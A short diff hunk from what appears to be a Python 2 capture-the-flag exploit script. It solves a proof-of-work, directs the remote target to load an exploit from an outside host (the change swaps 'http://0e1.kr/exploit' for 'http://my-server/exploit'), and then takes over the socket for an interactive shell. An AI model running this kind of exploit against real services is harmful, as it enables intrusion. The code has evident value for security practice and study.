@@ -12,7 +12,7 @@ data=menu().split(' == ')[1].split('\n')[0].strip()
 print data
 r.sendline(os.popen('~/pow %s' % data).read())
 ii('y')
-go('http://0e1.kr/exploit')
+go('http://my-server/exploit')
 import telnetlib
 t=telnetlib.Telnet()
 t.sock = r.sock
